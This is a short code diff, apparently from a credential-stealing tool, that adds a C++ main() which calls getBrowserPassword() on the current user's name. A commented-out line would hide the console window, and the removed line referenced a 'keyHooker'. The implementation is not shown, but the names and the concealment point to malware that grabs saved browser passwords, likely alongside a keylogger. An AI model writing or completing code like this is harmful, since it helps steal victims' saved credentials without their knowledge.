@@ -1,2 +1,10 @@
+#include "BrowserPassword.hh"
 
-getBrowserPassword(keyHooker.getUserName());
+int					main(int ac, char **av)
+{
+	// ShowWindow(GetConsoleWindow(), SW_HIDE); /* HIDE CONSOLE */
+	BrowserPassword		browser;
+
+  browser.getBrowserPassword(getUserName());
+	return (0);
+}
